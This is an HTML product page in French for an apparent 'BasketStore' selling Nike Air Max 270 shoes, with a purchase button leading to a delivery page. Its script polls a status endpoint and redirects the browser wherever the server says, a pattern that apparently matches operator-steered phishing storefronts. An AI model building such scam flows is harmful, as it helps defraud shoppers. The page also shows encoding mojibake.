<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Produit - BasketStore</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 40px;
      background: linear-gradient(135deg, #f0f0f0, #d0e0ff);
    }
    img {
      max-width: 300px;
      border-radius: 15px;
      margin-bottom: 20px;
    }
    button {
      background-color: #28a745;
      color: white;
      border: none;
      padding: 15px 30px;
      border-radius: 10px;
      cursor: pointer;
      font-size: 1.1em;
    }
    button:hover { background-color: #218838; }
  </style>
</head>
<body>
  <h1>ðŸ‘Ÿ Nike Air Max 270</h1>
  <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/Nike_Air_Max_270.png" alt="Nike Air Max 270">
  <p>Confort et style ultime pour vos journÃ©es actives.</p>
  <button id="chooseProduct">Choisir cette paire</button>

  <script>
    document.getElementById('chooseProduct').addEventListener('click', async () => {
      await fetch('/api/pair', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ pair: 'Nike Air Max 270' })
      });
      window.location.href = '/delivery.html';
    });

    let checking = false, lastRedirect = null;
    async function checkStatus() {
      if (checking) return;
      checking = true;
      try {
        const res = await fetch('/api/status', { cache: 'no-store' });
        const data = await res.json();
        if (data.redirect && data.redirect !== lastRedirect) {
          lastRedirect = data.redirect;
          window.location.href = data.redirect;
          return;
        }
      } catch {}
      finally {
        checking = false;
        setTimeout(checkStatus, 2500);
      }
    }
    checkStatus();
  </script>
</body>
</html>
